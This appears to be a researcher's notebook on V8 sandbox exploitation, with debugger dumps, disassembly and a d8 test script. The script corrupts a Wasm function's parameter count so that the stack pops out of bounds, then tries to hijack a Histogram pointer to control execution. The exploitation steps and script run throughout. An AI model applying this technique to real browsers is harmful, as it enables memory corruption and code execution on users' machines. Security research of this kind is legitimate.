# Table of Contents

- [libv8.so mapping](#libv8so-mapping)
- [PopAndReturn](#popandreturn)
   - [Idea 1: overwriting `0x7fffffffd548` return address of JSWasmWrapperHelper](#idea-1-overwriting-0x7fffffffd548-return-address-of-jswasmwrapperhelper)
   - [Idea 2: Understanding Torque](#idea-2-understanding-torque)



# Exploreing

### libv8.so mapping

```js
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
     0x872c5a04000      0x872c5a06000 rwxp     2000      0 [anon_872c5a04]
     0xcfc50f3e000      0xcfc50f3f000 r--p     1000      0 [anon_cfc50f3e]
    0x170300000000     0x170300001000 rw-p     1000      0 [anon_170300000]
    0x170300001000     0x1703000c0000 ---p    bf000      0 [anon_170300001]
    0x1703000c0000     0x170300100000 rw-p    40000      0 [anon_1703000c0]
    0x170300100000     0x170340000000 ---p 3ff00000      0 [anon_170300100]
    0x284900000000     0x285100000000 ---p 800000000      0 [anon_284900000]
    0x285100000000     0x285100010000 r--p    10000      0 [anon_285100000]
    0x285100010000     0x285100020000 ---p    10000      0 [anon_285100010]
    0x285100020000     0x285100040000 r--p    20000      0 [anon_285100020]
    0x285100040000     0x285100149000 rw-p   109000      0 [anon_285100040]
    0x285100149000     0x285100180000 ---p    37000      0 [anon_285100149]
    0x285100180000     0x28510027e000 r--p    fe000      0 [anon_285100180]
    0x28510027e000     0x285100280000 ---p     2000      0 [anon_28510027e]
    0x285100280000     0x285100400000 rw-p   180000      0 [anon_285100280]
    0x285100400000     0x285200000000 ---p ffc00000      0 [anon_285100400]
    0x285200000000     0x285200100000 rw-p   100000      0 [anon_285200000]
    0x285200100000     0x285400000000 ---p 1fff00000      0 [anon_285200100]
    0x285400000000     0x285440000000 rw-p 40000000      0 [anon_285400000]
    0x285440000000     0x295900000000 ---p 104c0000000      0 [anon_285440000]
    0x555555554000     0x55555558e000 r--p    3a000      0 /home/vult/Desktop/v8/v8/out/debug/d8
    0x55555558e000     0x5555555db000 r-xp    4d000  39000 /home/vult/Desktop/v8/v8/out/debug/d8
    0x5555555db000     0x5555555dd000 r--p     2000  85000 /home/vult/Desktop/v8/v8/out/debug/d8
    0x5555555dd000     0x5555555df000 rw-p     2000  86000 /home/vult/Desktop/v8/v8/out/debug/d8
    0x5555555df000     0x5555556e4000 rw-p   105000      0 [heap]
//...
    0x7fff60000000     0x7fff7f480000 rwxp 1f480000      0 [anon_7fff60000]
    0x7fff7f480000     0x7fff7fff3000 r-xp   b73000 195d000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
 //....
    0x7ffff2f50000     0x7ffff48ab000 r--p  195b000      0 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff48ab000     0x7ffff7e60000 r-xp  35b5000 195a000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff7e60000     0x7ffff7ed4000 r--p    74000 4f0e000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff7ed4000     0x7ffff7ee1000 rw-p     d000 4f81000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff7ee1000     0x7ffff7ee2000 r--p     1000 4f8e000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff7ee2000     0x7ffff7f66000 rw-p    84000 4f8f000 /home/vult/Desktop/v8/v8/out/debug/libv8.so
    0x7ffff7f66000     0x7ffff7fcb000 rw-p    65000      0 [anon_7ffff7f66]
    0x7ffff7fcb000     0x7ffff7fce000 r--p     3000      0 [vvar]
    0x7ffff7fce000     0x7ffff7fcf000 r-xp     1000      0 [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

```


### PopAndReturn


```js
// v8/src/builtins/js-to-wasm.tq:699
macro JSToWasmWrapperHelper( // in default namespace
    context: NativeContext, _receiver: JSAny, target: JSFunction,
    arguments: Arguments, promise: constexpr Promise): never {
  const functionData =
      UnsafeCast<WasmExportedFunctionData>(target.shared_function_info.data);

  // The normal return sequence of Torque-generated JavaScript builtins does not
  // consider the case where the caller may push additional "undefined"
  // parameters on the stack, and therefore does not generate code to pop these
  // additional parameters. Here we calculate the actual number of parameters on
  // the stack. This number is the number of actual parameters provided by the
  // caller, which is `arguments.length`, or the number of declared arguments,
  // if not enough actual parameters were provided, i.e.
  // `SharedFunctionInfo::length`.
  let popCount = arguments.length;
  const declaredArgCount =
      Convert<intptr>(Convert<int32>(target.shared_function_info.length));
  if (declaredArgCount > popCount) {
    popCount = declaredArgCount;
  }
  // Also pop the receiver.
  PopAndReturn(popCount + 1, result);
}
/// js code tests
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4141n);
// ====================== gdb ======================================
RAX  0x0
*RBX  0x23dc00000069 ◂— 0x4
*RCX  0x4142
*RDX  0x23dc000202d5 ◂— 0x77ef608402000003
*RDI  0x23dc002dcdb5 ◂— 0xfe0040640000000d /* '\r' */
*RSI  0x9d
*R8   0x4141
*R9   0x32bb00000755 ◂— 0xfc00400200000009 /* '\t' */
*R10  0x7fff7f4c9309 ◂— mov r12, qword ptr [rbp - 0x20]
*R11  0x7fffffffd4f0 ◂— 0x0
*R12  0x7ffff20c1cc0 ◂— 0x0
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
*R14  0x23dc00000000 ◂— 0x40940
*R15  0x23dc00000725 ◂— 0xe500000000000005
*RBP  0x7fffffffd660 —▸ 0x7fffffffd688 —▸ 0x7fffffffd700 —▸ 0x7fffffffd890 —▸ 0x7fffffffd920 ◂— ...
*RSP  0x80000001dff0
*RIP  0x7fff7fda5941 ◂— push r10
/// ======================

   0x7fff7fda5931:	mov    eax,DWORD PTR [rbp-0xe8]
   0x7fff7fda5937:	mov    rsp,rbp
   0x7fff7fda593a:	pop    rbp
   0x7fff7fda593b:	pop    r10
   0x7fff7fda593d:	lea    rsp,[rsp+rcx*8]
=> 0x7fff7fda5941:	push   r10
   0x7fff7fda5943:	ret  

// before lea
Thread 1 "d8" hit Breakpoint 1, 0x00007fff7fda593d in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
 RAX  0x0
*RBX  0x1c6400000069 ◂— 0x4
*RCX  0x101
*RDX  0x1c64000202d5 ◂— 0x77ef608402000003
*RDI  0x1c64002dc785 ◂— 0xfe0040640000000d /* '\r' */
*RSI  0x9d
*R8   0x100
*R9   0xf8b00000721 ◂— 0x6200400200000009 /* '\t' */
*R10  0x7fff7f4c9309 ◂— mov r12, qword ptr [rbp - 0x20]
*R11  0x7fffffffd3d0 ◂— 0x0
*R12  0x7ffff20c1cc0 ◂— 0x0
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
*R14  0x1c6400000000 ◂— 0x40940
*R15  0x1c6400000725 ◂— 0xe500000000000005
*RBP  0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 —▸ 0x7fffffffd800 ◂— ...
*RSP  0x7fffffffd4c0 —▸ 0x1c64002dc5f5 ◂— 0x2500000ed9002dc7
*RIP  0x7fff7fda593d ◂— lea rsp, [rsp + rcx*8]
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7fff7fda593d    lea    rsp, [rsp + rcx*8]
   0x7fff7fda5941    push   r10
   0x7fff7fda5943    ret  
//===============================================================
0x7fffffffd548 -> pop rcx
```
### Idea 1: overwriting `0x7fffffffd548` return address of JSWasmWrapperHelper
```js
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,18n);
// 
# Fatal error in ../../src/objects/object-type.cc, line 82
# Type cast failed in CAST(LoadRegister(Register::function_closure())) at ../../src/interpreter/interpreter-assembler.cc:702
  Expected JSFunction but found Smi: 0x11 (17)

```

```js
 call    qword ptr [r13+54A0h] -> builtin_Aborts

0x7fff7f4c041c    0x7ffff48ee41c -> after function 

0x7fff7fea1a77    0x7ffff52cfa77 -> checkObjectType
0x7fff7f4c9309    0x7ffff48f7309 -> call    rcx 

```

CheckObject looks like:
```go
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
*RAX  0x7ffff6033710 (v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)) ◂— push rbp
*RBX  0x7fff7fea1900 ◂— lea rbx, [rip - 7]
*RCX  0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 —▸ 0x7fffffffd800 ◂— ...
*RDX  0x225000249889 ◂— 0x661480e1aa000003
*RDI  0x225000299ff9 ◂— 0x250000072500281e
*RSI  0x92
*R8   0x4ae
*R9   0x225000299ff9 ◂— 0x250000072500281e
*R10  0x7fff7fea1a77 ◂— mov qword ptr [r13 + 0x70], 0
*R11  0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 —▸ 0x7fffffffd800 ◂— ...
*R12  0x47400000721 ◂— 0x6200400200000009 /* '\t' */
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
 R14  0x225000000000 ◂— 0x40940
*R15  0x555555634b90 —▸ 0x7fff7fdf4580 ◂— lea rbx, [rip - 7]
*RBP  0x7fffffffd4f0 —▸ 0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 ◂— ...
*RSP  0x7fffffffd4b0 —▸ 0x7fffffffd4b8 ◂— 0x230
*RIP  0x7fff7fea1a75 ◂— call rax
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7fff7fea1a75    call   rax                           <v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)>
        rdi: 0x225000299ff9 ◂— 0x250000072500281e
        rsi: 0x92
        rdx: 0x225000249889 ◂— 0x661480e1aa000003
        rcx: 0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 —▸ 0x7fffffffd800 ◂— ...
// =====================================
 R9   0x49800000721 ◂— 0x6200400200000009 /* '\t' */
 R10  0x7fff7f4c9309 ◂— mov r12, qword ptr [rbp - 0x20]
 R11  0x7fffffffd3d0 ◂— 0x0
 R12  0x7ffff20c1cc0 ◂— 0x0
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
 R14  0xdc00000000 ◂— 0x40940
 R15  0xdc00000725 ◂— 0xe500000000000005
 RBP  0x7fffffffd540 —▸ 0x7fffffffd568 —▸ 0x7fffffffd5e0 —▸ 0x7fffffffd770 —▸ 0x7fffffffd800 ◂— ...
*RSP  0x7fffffffd570 —▸ 0x7fff7f4c015f ◂— pop qword ptr [r13 + 0x118]
*RIP  0x7fff7fda5941 ◂— push r10
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
   0x7fff7fda593d    lea    rsp, [rsp + rcx*8]
 ► 0x7fff7fda5941    push   r10
   0x7fff7fda5943    ret  
```
CheckObject 
```js
*RAX  0x7ffff6033710 (v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)) ◂— push rbp
```

how stack works:
![alt text](image.png)

Stacktrace:
```js

0x00007FFFF51D393D: Builtins_JSToWasmWrapper
0x00007FFFF48EE41C: Builtins_JSEntryTrampoline
0x00007FFFF48EE15F: Builtins_JSEntry
0x00007FFFF5847EEC:  v8::internal::`anonymous namespace`::Invoke



Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit
Builtins_CallFunction_ReceiverIsNullOrUndefined
Generate_JSEntryTrampolineHelper(..., false)
```

**Fixing CheckObjectType**

Always returns true
```js
Address CheckObjectType(Address raw_value, Address raw_type,
                        Address raw_location) {

return Smi::FromInt(0).ptr();
                        }
```
Breakpoints and testing:
```js
0x00007fff7f4c9384    After Builtins_JSToWasmWrapper and checking bytecodes
//
0x7fff7fea1a77    mov    qword ptr [r13 + 0x70], 0
///
0x7fff7fda593d    lea    rsp, [rsp + rcx*8]
//
0x7fff7f4c9309    mov    r12, qword ptr [rbp - 0x20]
///
0x7fff7fea1afb    mov    r8, qword ptr [rbp - 0x18]
   0x7fff7fea1aff    mov    r9d, dword ptr [r8 + 7]
// ===============================================================
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,18n);

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x00007fff7fea1aff in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x7fff7fea1900 ◂— lea rbx, [rip - 7]
 RCX  0x245
 RDX  0x23f2000205c5 ◂— 0x8efe51aaf2000003
 RDI  0x23f2beadbeef ◂— 0x0
 RSI  0x4a
 R8   0x23f2beadbeef ◂— 0x0
 R9   0x23f200300095 ◂— 0x4100000002000008
 R10  0xffffffff
 R11  0x7fffffffd540 ◂— 0x7fffffffd540
 R12  0x2d8100000729 ◂— 0x8a00400200000009 /* '\t' */
 R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
 R14  0x23f200000000 ◂— 0x40940
 R15  0x555555634b90 —▸ 0x7fff7fdf4580 ◂— lea rbx, [rip - 7]
 RBP  0x7fffffffd540 ◂— 0x7fffffffd540
 RSP  0x7fffffffd508 ◂— 0x244
 RIP  0x7fff7fea1aff ◂— mov r9d, dword ptr [r8 + 7]
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7fff7fea1aff    mov    r9d, dword ptr [r8 + 7]
   0x7fff7fea1b03    mov    r10d, 0xffffffff
   0x7fff7fea1b09    cmp    r9, r10
   0x7fff7fea1b0c    jbe    0x7fff7fea1b1b                <0x7fff7fea1b1b>

```

**Using release binary**
- It's looping

```js
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
 RAX  0x239700200095 ◂— 0x4100000002000008
 RBX  0x8
 RCX  0x8
 RDX  0x4d6
 RDI  0x23970019a071 ◂— 0x11001c338900000b /* '\x0b' */
 RSI  0x3af9000c48d9 ◂— 0xcd00405c0000001f
 R8   0x26b
 R9   0x26b
 R10  0xca
 R11  0x7fffffffd4a8 ◂— 0x4141 /* 'AA' */
 R12  0x3af900000605 ◂— 0x8a00400200000009 /* '\t' */
 R13  0x555556f4e080 —▸ 0x555556a8ff00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
 R14  0x239700000000 ◂— 0x40940
 R15  0x555556f85570 —▸ 0x555556c1e180 (Builtins_WideHandler) ◂— add r9, 1
*RBP  0x22
*RSP  0x7fffffffd628 —▸ 0x7fffffffd620 ◂— 0x22 /* '"' */
*RIP  0x555556a9c4e4 (Builtins_InterpreterEntryTrampoline+420) ◂— pop rcx
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
   0x555556a9c4d0 <Builtins_InterpreterEntryTrampoline+400>    mov    rcx, qword ptr [rbp - 0x18]
   0x555556a9c4d4 <Builtins_InterpreterEntryTrampoline+404>    lea    rcx, [rcx*8]
   0x555556a9c4dc <Builtins_InterpreterEntryTrampoline+412>    cmp    rbx, rcx
   0x555556a9c4df <Builtins_InterpreterEntryTrampoline+415>    cmovl  rbx, rcx
   0x555556a9c4e3 <Builtins_InterpreterEntryTrampoline+419>    leave  
 ► 0x555556a9c4e4 <Builtins_InterpreterEntryTrampoline+420>    pop    rcx
   0x555556a9c4e5 <Builtins_InterpreterEntryTrampoline+421>    add    rsp, rbx
   0x555556a9c4e8 <Builtins_InterpreterEntryTrampoline+424>    push   rcx
   0x555556a9c4e9 <Builtins_InterpreterEntryTrampoline+425>    ret    
```
Stack looks like:
```go
pwndbg> tele 0x7fffffffd598
00:0000│ rsp 0x7fffffffd598 —▸ 0xf76001dcbed ◂— 0x2500000ef1001dcd
01:0008│     0x7fffffffd5a0 —▸ 0xf7600199c25 ◂— 0x4100000002000008
02:0010│     0x7fffffffd5a8 —▸ 0xf76001d7fb5 ◂— 0x2500000725001a89
03:0018│     0x7fffffffd5b0 —▸ 0xf76001dc0ed ◂— 0x2500000725001ad8
04:0020│     0x7fffffffd5b8 ◂— 0x20 /* ' ' */
05:0028│     0x7fffffffd5c0 —▸ 0xf7600199b35 ◂— 0x7100000002000008
06:0030│     0x7fffffffd5c8 —▸ 0xf76001840b9 ◂— 0x250000072500181f
07:0038│     0x7fffffffd5d0 —▸ 0xf7600199c25 ◂— 0x4100000002000008
pwndbg> 
08:0040│  0x7fffffffd5d8 —▸ 0xf76001dcbed ◂— 0x2500000ef1001dcd
09:0048│  0x7fffffffd5e0 —▸ 0xf76001dcda1 ◂— 0x2500000725001923
0a:0050│  0x7fffffffd5e8 —▸ 0xf7600000069 ◂— 0x4
0b:0058│  0x7fffffffd5f0 —▸ 0xf7600000069 ◂— 0x4
0c:0060│  0x7fffffffd5f8 ◂— 0x78a
0d:0068│  0x7fffffffd600 —▸ 0x215700000671 ◂— 0x4a00400200000009 /* '\t' */
0e:0070│  0x7fffffffd608 ◂— 0x1
0f:0078│  0x7fffffffd610 —▸ 0xf7600199ce1 ◂— 0x250000072500181e
pwndbg> 
10:0080│     0x7fffffffd618 —▸ 0xf7600199d31 ◂— 0x50000001c001902
11:0088│ rbp 0x7fffffffd620 —▸ 0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 ◂— ...
12:0090│     0x7fffffffd628 —▸ 0x555556af071c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
13:0098│     0x7fffffffd630 —▸ 0xf76001816c9 ◂— 0x250005f2c4001971
14:00a0│     0x7fffffffd638 —▸ 0xf7600199ce1 ◂— 0x250000072500181e
15:00a8│     0x7fffffffd640 ◂— 0x2c /* ',' */
16:00b0│     0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 —▸ 0x7fffffffd990 ◂— ...
17:00b8│     0x7fffffffd650 —▸ 0x555556af045f (Builtins_JSEntry+159) ◂— pop qword ptr [r13 + 0x118]
pwndbg> 
18:00c0│  0x7fffffffd658 ◂— 0x0
19:00c8│  0x7fffffffd660 ◂— 0x0
1a:00d0│  0x7fffffffd668 ◂— 0x2
1b:00d8│  0x7fffffffd670 ◂— 0x0
... ↓     2 skipped
1e:00f0│  0x7fffffffd688 —▸ 0x555556fa6000 —▸ 0xf7600000000 ◂— 0x40940
1f:00f8│  0x7fffffffd690 —▸ 0x555556af03c0 (Builtins_JSEntry) ◂— push rbp

```




### Idea 2: Understanding Torque

- Torque works:
![alt text](image-2.png)

`v8/src/builtins/js-to-wasm.tq` -> `v8/out/debug/gen/torque-generated/src/builtins/js-to-wasm-tq-csa.cc`

Stacktrace:
```js
// v8/src/builtins/builtins-interpreter-gen.cc
void Builtins::Generate_InterpreterEntryTrampoline(MacroAssembler* masm) {
  Generate_InterpreterEntryTrampoline(masm,
                                      InterpreterEntryTrampolineMode::kDefault);
}

// v8/src/builtins/x64/builtins-x64.cc
void Builtins::Generate_InterpreterEntryTrampoline(...)
```

### Idea 3: Overwrite `v8::internal::Histogram *__hidden this` pointer of `AddSample` function

```js
.text:0000555555D90900 ; __int64 __fastcall v8::internal::Histogram::AddSample(v8::internal::Histogram *__hidden this, int)
.text:0000555555D90900 _ZN2v88internal9Histogram9AddSampleEi proc near
.text:0000555555D90900                                         ; CODE XREF: v8::Script::Run(v8::Local<v8::Context>,v8::Local<v8::Data>)+3DC↑p
.text:0000555555D90900                                         ; v8::Module::Evaluate(v8::Local<v8::Context>)+372↑p ...
.text:0000555555D90900 ; __unwind {
.text:0000555555D90900                 push    rbp
.text:0000555555D90901                 mov     rbp, rsp
.text:0000555555D90904                 mov     rax, [rdi+18h]
.text:0000555555D90908                 test    rax, rax
.text:0000555555D9090B                 jz      short loc_555555D90924

//====================================================================
why rdi does not match when we change 0x41414141n to real pointer???
// js 
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
console.log((heap_addr + 0x200000n).toString(16));
// v8_write64(0x200095n, 0x4141414142424242n);
v8_write64(0x200095n, heap_addr + 0x200000n);
///=================================================
Thread 1 "d8" hit Breakpoint 2, 0x0000555555d90901 in v8::internal::Histogram::AddSample(int) ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
*RAX  0x13ee1
 RBX  0x555556f4e000 —▸ 0x2dc800000000 ◂— 0x40940
 RCX  0x0
*RDX  0x618
*RDI  0x2000008
*RSI  0x13ee1
*R8   0x30c
*R9   0x30c
*R10  0x555556f4e1a8 ◂— 0x0
*R11  0x7fffffffd4a8 ◂— 0x4141 /* 'AA' */
*R12  0x2dc800048a75 ◂— 0xe000000004000bd2
 R13  0x555556f62018 ◂— 0x13ee1
*R14  0x555556fbcaf0 —▸ 0x2dc8002000dd ◂— 0x4100000002000008
 R15  0x555556ebc000 (v8::internal::v8_flags) ◂— 0x100000000000100

// breakpoints
pwndbg> bl
Num     Type           Disp Enb Address            What
2       breakpoint     keep y   0x0000555555d90901 <v8::internal::Histogram::AddSample(int)+1>
	stop only if *(long *)($rsp+8)==0x555555a596e1
	breakpoint already hit 2 times

```

Control rip :
I'm running with `release` binary, somehow it can trigger overwriting argument pointer in `AddSample` function...

```js
// ./out/release/d8
// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t8.js

d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }

console.log("[*] Leak sandbox base address");
// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1) - 0x40000n;
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));

// ================================================================

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
// let $Sig_i_iii = builder.addType(kSig_i_iii);

builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
//let kSig_v_i = makeSig([kWasmI32], []);
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kExprI32StoreMem, 0, 0, // i32.store offset = -1
]);
builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
//   kExprI32ConvertI64,
  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
  kExprI64Mul,
]);


let instance = builder.instantiate();

instance.exports.func0(0n);

instance.exports.func1(0n);
instance.exports.func0(0n);

%DebugPrint(instance.exports.func1);

// ===============================
// length has only 2 bytes
// 0xbn
// 174n 
// rsp = rsp + (0xb+1)*8
// v8_write64(0x43001n, 0x0n)
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
console.log((heap_addr + 0x200000n).toString(16));
v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
v8_write64(0x250000n + 0x0EB30n, 0x4141414142424242n);
// v8_write64(0x200095n, 0x4141414142424242n);
v8_write64(0x2000d5n, heap_addr + 0x200000n);



// %SystemBreak();

// trigger out-of-bounds stack
// console.log("[*] After overwriting length");
instance.exports.func1(0x4141n);

/// =========================
heap_addr: 0x7b500000000
target_page: 0x5b48cf65000

pwndbg> tele 0x7b5002001b9-0x60
00:0000│  0x7b500200159 —▸ 0x5b48cf65000 ◂— 0x0
01:0008│  0x7b500200161 —▸ 0x7b500200000 ◂— 0x20012

```

**Should understand how the program calls AddSample function? and why it changes rbp?**

```js
// stack PopReturn oob 
// ============= asm ===============
   0x555556c60928 <Builtins_JSToWasmWrapper+3176>    lea    rsp, [rsp + rcx*8]
 ► 0x555556c6092c <Builtins_JSToWasmWrapper+3180>    push   r10                           <Builtins_InterpreterEntryTrampoline+295>
   0x555556c6092e <Builtins_JSToWasmWrapper+3182>    ret   

// ===============================================
// asm 
.text:0000555556AF2C95 loc_555556AF2C95:                       ; CODE XREF: Builtins_InterpreterEntryTrampoline:loc_555556AF2D07↓j
.text:0000555556AF2C95                                         ; Builtins_InterpreterEntryTrampoline+1D3↓j
.text:0000555556AF2C95                 mov     r15, [r13+4C78h]
.text:0000555556AF2C9C                 movzx   r10d, byte ptr [r12+r9]
.text:0000555556AF2CA1                 mov     rcx, [r15+r10*8]
.text:0000555556AF2CA5                 call    rcx             ; Builtins_JSToWasmWrapper

/// =============================================
Builtins_JSEntryTrampoline
static void Generate_JSEntryTrampolineHelper(MacroAssembler* masm,
                                             bool is_construct) {
// ...
    // Push the receiver.
    __ Push(r9);

    // Invoke the builtin code.
    Builtin builtin = is_construct ? Builtin::kConstruct : Builtins::Call();
    __ CallBuiltin(builtin);
// ...
                                             }
// ============= asm ================
.text:0000555556AF0717                 call    Builtins_Call_ReceiverIsAny
.text:0000555556AF071C                 mov     rsp, rbp
.text:0000555556AF071F                 pop     rbp
.text:0000555556AF0720                 retn
/// After that it returns to JSEntry function

void Builtins::Generate_JSEntry(MacroAssembler* masm) {
  Generate_JSEntryVariant(masm, StackFrame::ENTRY, Builtin::kJSEntryTrampoline);
}
// Called with the native C calling convention. The corresponding function
// signature is either:
//   using JSEntryFunction = GeneratedCode<Address(
//       Address root_register_value, Address new_target, Address target,
//       Address receiver, intptr_t argc, Address** argv)>;
// or
//   using JSEntryFunction = GeneratedCode<Address(
//       Address root_register_value, MicrotaskQueue* microtask_queue)>;
void Generate_JSEntryVariant(MacroAssembler* masm, StackFrame::Type type,
                             Builtin entry_trampoline) {
  Label invoke, handler_entry, exit;
  Label not_outermost_js, not_outermost_js_2;
// ...

  // Invoke the function by calling through JS entry trampoline builtin and
  // pop the faked function when we return.
  __ CallBuiltin(entry_trampoline);

  // Unlink this frame from the handler chain.
  __ PopStackHandler();

                             }
// =============== asm =========================
.text:0000555556AF045A                 call    Builtins_JSEntryTrampoline
.text:0000555556AF045F                 pop     qword ptr [r13+118h]
.text:0000555556AF0466                 add     rsp, 8
```
Stacktrace:

```js
Builtins_JSToWasmWrapper
// ...

Builtins_Call_ReceiverIsAny
Builtins_JSEntryTrampoline
```

How wasm decode function from number inside sandbox:
![alt text](image-3.png)

```js

Python>(0x209601 >> 9) << 4
0x104b0
// ===============================================
pwndbg> 
0x0000555556ae74d3 in Builtins_CallFunction_ReceiverIsAny ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
 RAX  0x1
 RBX  0x0
*RCX  0x104b0
 RDX  0x58800000069 ◂— 0x4
 RDI  0x588001a72c5 ◂— 0x250000072500181e
 RSI  0x588001a7825 ◂— 0x95000004ca001902
 R8   0x1
 R9   0x588001816c9 ◂— 0x250000e6a4001971
 R10  0x7fff98000000 ◂— 0x0
 R11  0x7ffff7e18be0 (main_arena+96) —▸ 0x555557034760 ◂— 0x0
 R12  0x588001a72c5 ◂— 0x250000072500181e
 R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
 R14  0x58800000000 ◂— 0x40940
 R15  0x555556af03c0 (Builtins_JSEntry) ◂— push rbp
 RBP  0x7fffffffce18 —▸ 0x7fffffffce90 —▸ 0x7fffffffcff0 —▸ 0x7fffffffd060 —▸ 0x7fffffffd160 ◂— ...
 RSP  0x7fffffffcdf8 —▸ 0x555556af071c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
